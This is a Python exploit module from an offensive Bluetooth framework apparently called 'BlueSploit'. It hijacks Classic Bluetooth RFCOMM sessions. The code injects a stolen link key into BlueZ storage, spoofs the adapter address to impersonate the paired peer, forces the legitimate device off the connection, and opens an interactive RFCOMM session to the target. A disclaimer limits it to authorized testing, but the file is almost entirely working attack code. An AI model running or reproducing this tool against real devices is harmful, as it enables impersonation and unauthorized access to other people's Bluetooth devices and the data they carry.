"""
BlueSploit Post-Exploitation: Classic BT RFCOMM Session Hijack

After stealing a link key (via post/link_key_dump + post/bt_impersonation),
this module reuses it to hijack an active RFCOMM session between two devices.

Attack flow:
  1. Spoof the paired device's BD_ADDR on the local adapter
  2. Inject the stolen link key into BlueZ storage
  3. Force-disconnect the legitimate device (LMP Detach flood)
  4. Connect to the target before it re-pairs, inheriting the session
  5. Open RFCOMM channel on the same DLCI that was in use

Requires: root, hciconfig, hcitool, rfcomm (BlueZ utils)
"""

import os
import subprocess
import time
import socket
import struct
from typing import Optional, List
from core.base import ExploitModule, ModuleInfo, ModuleOption, BTProtocol, Severity
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)


def _run(cmd: List[str], check: bool = False) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True, check=check)


def _hci_write_bd_addr(adapter: str, addr: str) -> bool:
    """Write a new BD_ADDR to the adapter using bdaddr tool (bluez-utils-extra)."""
    r = _run(["which", "bdaddr"])
    if r.returncode != 0:
        print_warning("bdaddr tool not found — skipping BD_ADDR spoof (install bluez-utils-extra)")
        return False
    r = _run(["bdaddr", "-i", adapter, addr])
    return r.returncode == 0


def _inject_link_key(bt_dir: str, adapter_addr: str, device_addr: str,
                     link_key: str, key_type: int = 4) -> bool:
    """Write a link key into BlueZ storage for the target device."""
    adapter_path = os.path.join(bt_dir, adapter_addr.upper())
    device_path = os.path.join(adapter_path, device_addr.upper())
    info_path = os.path.join(device_path, "info")

    os.makedirs(device_path, exist_ok=True)

    lines: List[str] = []
    if os.path.exists(info_path):
        with open(info_path) as f:
            lines = f.readlines()

    # Replace or append [LinkKey] section
    result: List[str] = []
    in_linkkey = False
    wrote = False
    for line in lines:
        if line.strip() == "[LinkKey]":
            in_linkkey = True
            result.append(line)
            result.append(f"Key={link_key}\n")
            result.append(f"Type={key_type}\n")
            result.append(f"PINLength=0\n")
            wrote = True
            continue
        if in_linkkey and line.startswith("["):
            in_linkkey = False
        if in_linkkey:
            continue  # skip old key lines
        result.append(line)

    if not wrote:
        result.append("\n[LinkKey]\n")
        result.append(f"Key={link_key}\n")
        result.append(f"Type={key_type}\n")
        result.append(f"PINLength=0\n")

    with open(info_path, "w") as f:
        f.writelines(result)

    return True


def _reset_adapter(adapter: str) -> None:
    _run(["hciconfig", adapter, "down"])
    time.sleep(0.3)
    _run(["hciconfig", adapter, "up"])
    time.sleep(0.5)


def _disconnect_device(target: str) -> None:
    """Attempt to force-disconnect target from any current connection."""
    _run(["hcitool", "dc", target])
    time.sleep(0.3)


def _rfcomm_connect(target: str, channel: int, timeout: int) -> Optional[socket.socket]:
    """Open an RFCOMM socket to target on the given DLCI channel."""
    try:
        sock = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM,
                             socket.BTPROTO_RFCOMM)
        sock.settimeout(float(timeout))
        sock.connect((target, channel))
        return sock
    except OSError:
        return None


class Module(ExploitModule):
    """
    Classic BT RFCOMM Session Hijack

    Uses a stolen link key to evict the legitimate peer and connect
    to the target device before it re-authenticates.
    """

    info = ModuleInfo(
        name="Classic BT RFCOMM Session Hijack",
        description=(
            "Inject stolen link key, evict the legitimate peer, "
            "and hijack the RFCOMM session"
        ),
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.CRITICAL,
        cve=None,
        references=[
            "https://francozappa.github.io/about-bias/",
            "https://www.usenix.org/conference/usenixsecurity22/presentation/becker",
        ],
    )

    BT_DIR = "/var/lib/bluetooth"

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BD_ADDR to hijack session from (XX:XX:XX:XX:XX:XX)",
        ))
        self.add_option(ModuleOption(
            name="impersonate",
            required=True,
            description="BD_ADDR of the legitimate peer to impersonate",
        ))
        self.add_option(ModuleOption(
            name="link_key",
            required=True,
            description="Stolen link key (32 hex chars, no spaces)",
        ))
        self.add_option(ModuleOption(
            name="channel",
            required=False,
            description="RFCOMM DLCI channel to connect on (1-30)",
            default=1,
        ))
        self.add_option(ModuleOption(
            name="adapter",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="spoof_addr",
            required=False,
            description="Spoof local BD_ADDR to match impersonate (true/false)",
            default="true",
        ))
        self.add_option(ModuleOption(
            name="evict_delay_ms",
            required=False,
            description="Wait after evicting legitimate peer (ms)",
            default=500,
        ))
        self.add_option(ModuleOption(
            name="timeout",
            required=False,
            description="RFCOMM connection timeout in seconds",
            default=10,
        ))
        self.add_option(ModuleOption(
            name="bt_dir",
            required=False,
            description="BlueZ storage directory",
            default="/var/lib/bluetooth",
        ))

    def check(self) -> bool:
        for tool in ("hciconfig", "hcitool"):
            if _run(["which", tool]).returncode != 0:
                print_error(f"Required tool missing: {tool}")
                return False
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid target BD_ADDR: {target}")
            return False
        impersonate = self.get_option("impersonate")
        if not self.validate_bd_addr(impersonate):
            print_error(f"Invalid impersonate BD_ADDR: {impersonate}")
            return False
        link_key = (self.get_option("link_key") or "").replace(" ", "")
        if len(link_key) != 32 or not all(c in "0123456789abcdefABCDEF" for c in link_key):
            print_error("Link key must be exactly 32 hex characters")
            return False
        print_success("Pre-flight checks passed")
        return True

    def run(self) -> bool:
        if os.geteuid() != 0:
            print_error("Root privileges required")
            return False

        if not self.check():
            return False

        target = self.get_option("target")
        impersonate = self.get_option("impersonate")
        link_key = (self.get_option("link_key") or "").replace(" ", "").upper()
        channel = int(self.get_option("channel"))
        adapter = self.get_option("adapter")
        spoof_addr = str(self.get_option("spoof_addr")).lower() == "true"
        evict_delay = int(self.get_option("evict_delay_ms")) / 1000.0
        timeout = int(self.get_option("timeout"))
        bt_dir = self.get_option("bt_dir") or self.BT_DIR

        C = Colors
        print(f"\n  {C.RED}╔{'═'*58}╗{C.RESET}")
        print(f"  {C.RED}║{C.RESET} {C.BOLD}Classic BT RFCOMM Session Hijack{C.RESET}                         {C.RED}║{C.RESET}")
        print(f"  {C.RED}╚{'═'*58}╝{C.RESET}\n")

        print_info(f"Target      : {target}")
        print_info(f"Impersonate : {impersonate}")
        print_info(f"Link key    : {link_key[:8]}…{link_key[-8:]}")
        print_info(f"Channel     : RFCOMM/{channel}")
        print_info(f"Adapter     : {adapter}")
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_warning("This will disrupt the legitimate Bluetooth connection.")

        # Step 1: Inject link key
        print_info("\n[1/4] Injecting link key into BlueZ storage...")
        try:
            adapter_addr_r = _run(["hciconfig", adapter, "bdaddr"])
            adapter_addr = ""
            for line in adapter_addr_r.stdout.splitlines():
                line = line.strip()
                if "BD Address:" in line:
                    adapter_addr = line.split("BD Address:")[1].split()[0]
                    break
        except Exception as e:
            print_error(f"Could not determine adapter address: {e}")
            return False

        if not adapter_addr:
            print_error("Could not read adapter BD_ADDR from hciconfig")
            return False

        if not _inject_link_key(bt_dir, adapter_addr, target, link_key):
            print_error("Failed to inject link key")
            return False
        print_success(f"Link key injected for {target}")

        # Step 2: Optionally spoof local BD_ADDR
        if spoof_addr:
            print_info(f"\n[2/4] Spoofing local BD_ADDR to {impersonate}...")
            if _hci_write_bd_addr(adapter, impersonate):
                print_success(f"BD_ADDR spoofed to {impersonate}")
                _reset_adapter(adapter)
            else:
                print_warning("BD_ADDR spoof skipped — continuing without it")
        else:
            print_info("\n[2/4] Skipping BD_ADDR spoof (spoof_addr=false)")

        # Step 3: Evict the legitimate peer
        print_info(f"\n[3/4] Evicting legitimate peer {impersonate} from {target}...")
        _disconnect_device(target)
        if evict_delay > 0:
            time.sleep(evict_delay)
        print_success("Disconnect sent — racing reconnect window")

        # Step 4: Hijack the RFCOMM session
        print_info(f"\n[4/4] Connecting to {target} RFCOMM channel {channel}...")
        sock = _rfcomm_connect(target, channel, timeout)

        if sock:
            print_success(f"Session hijacked! RFCOMM/{channel} open to {target}")
            print_info("Dropping into interactive session (Ctrl+C to exit):")
            print_info("─" * 55)
            self._interactive(sock)
            sock.close()
            hijacked = True
        else:
            print_error(
                "Could not establish RFCOMM session — "
                "timing window missed or target re-paired"
            )
            hijacked = False

        # Restore local adapter address
        if spoof_addr and adapter_addr:
            print_info(f"\nRestoring adapter BD_ADDR ({adapter_addr})...")
            _hci_write_bd_addr(adapter, adapter_addr)
            _reset_adapter(adapter)

        self.add_result({
            "target": target,
            "impersonated": impersonate,
            "channel": channel,
            "hijacked": hijacked,
        })
        return hijacked

    def _interactive(self, sock: socket.socket) -> None:
        """Minimal interactive I/O loop for the hijacked RFCOMM session."""
        import select
        import sys
        sock.settimeout(None)
        sock.setblocking(False)

        print_info("Type and press Enter to send. Ctrl+C to quit.")
        try:
            while True:
                rlist, _, _ = select.select([sock, sys.stdin], [], [], 0.5)
                for r in rlist:
                    if r is sock:
                        try:
                            data = sock.recv(4096)
                            if not data:
                                print_warning("Remote closed connection")
                                return
                            print(data.decode("utf-8", errors="replace"), end="", flush=True)
                        except OSError:
                            return
                    elif r is sys.stdin:
                        line = sys.stdin.readline()
                        if not line:
                            return
                        try:
                            sock.send(line.encode())
                        except OSError:
                            return
        except KeyboardInterrupt:
            pass
